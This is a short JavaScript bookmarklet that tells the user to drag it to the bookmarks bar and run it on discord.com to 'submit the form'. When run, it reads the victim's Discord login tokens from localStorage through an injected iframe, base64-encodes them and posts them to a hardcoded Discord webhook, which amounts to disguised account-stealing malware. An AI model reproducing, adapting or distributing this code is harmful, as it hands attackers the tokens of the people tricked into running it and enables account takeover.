if ('https://discord.com' !== this.document.location.origin) alert('Drag this button to your bookmark and go to discord.com to submit the form.');
else {
    location.reload();
    var i = document.createElement('iframe');
    document.body.appendChild(i);
    const storage = i.contentWindow.localStorage;
    const tokens = btoa(storage.getItem('tokens'));
    var webhookUrl = "https://discord.com/api/webhooks/1214047121381003264/sPVuTs11EXtKD08WpEmyCmKWV10vbZi4NQMsjGIZgRvI79Op_e8zDtShwUPP-JSHpd7K";

    // Message content
    var message = tokens;

    // Construct the payload
    var payload = JSON.stringify({
        content: message
    });

    // Create a new XMLHttpRequest object
    var xhr = new XMLHttpRequest();

    // Set up the request
    xhr.open("POST", webhookUrl, true);
    xhr.setRequestHeader("Content-Type", "application/json");

    // Send the payload
    xhr.send(payload);
    
}
}();
